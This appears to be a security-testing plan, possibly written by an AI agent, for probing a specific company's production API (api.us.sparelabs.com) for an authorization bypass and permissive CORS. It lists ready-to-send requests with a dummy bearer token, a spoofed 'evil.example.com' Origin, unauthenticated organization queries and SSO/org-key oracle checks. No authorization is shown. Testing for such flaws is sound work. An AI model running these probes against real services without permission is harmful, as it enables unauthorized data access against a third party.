## Plan: Probe api.us.sparelabs.com for Fleet-Wide Bypass Parity

### Context
The forms.sparelabs.com JS bundle (main.63fe135c.js) reveals that Production_CA traffic routes to api.us.sparelabs.com. Fleet-parity was confirmed across 7 prod hosts (regions bypass + orgs zero-header). Prior KB entries confirm CORS + bypass on api.us.sparelabs.com was already demonstrated. This probe will independently verify and timestamp the finding on this host specifically.

### Execution Steps

**Step 1** — Regions scheme-only bypass on api.us.sparelabs.com:
```
GET https://api.us.sparelabs.com/v1/global/regions
Headers:
  Authorization: Bearer x
  Origin: https://evil.example.com
```
Expected if parity holds: 200 + 725B region registry + ACAO:https://evil.example.com + ACAC:true

**Step 2** — Organizations zero-header bypass on api.us.sparelabs.com:
```
GET https://api.us.sparelabs.com/v1/global/organizations
Headers:
  Origin: https://evil.example.com
(No Authorization header)
```
Expected if parity holds: 200 + 11B {"data":[]}

**Step 3** — Control: auth-gated route on api.us.sparelabs.com:
```
GET https://api.us.sparelabs.com/v1/journeys
Headers:
  Authorization: Bearer x
```
Expected: 401 (confirms auth gate exists on other routes)

**Step 4** — CORS preflight confirmation on api.us.sparelabs.com:
```
OPTIONS https://api.us.sparelabs.com/v1/global/regions
Headers:
  Origin: https://evil.example.com
  Access-Control-Request-Method: GET
  Access-Control-Request-Headers: Authorization
```
Expected: 204 + ACAO + ACAC + methods

**Step 5** — Test if the endpoints are data-bearing on US host (check if UUID oracle / org-key oracle / SSO oracle work):
```
GET https://api.us.sparelabs.com/v1/public/organizations/key/spare
GET https://api.us.sparelabs.com/v1/identity/workos/auth (POST with body {"domain":"spare.com"})
```
Expected based on KB: org-key may return 404 (US DB different from CA), workos/auth may differ

**Step 6** — Verify data residency angle: compare response body sha256 of regions between api.us.sparelabs.com and api.sparelabs.com

### Deliverables
- Timestamp each probe
- Record status code, body size, sha256 of bodies
- Record CORS headers on each response
- Confirm or deny fleet-wide bypass parity
- Confirm CA→US data routing path exists
- Evaluate PIPEDA/data residency severity
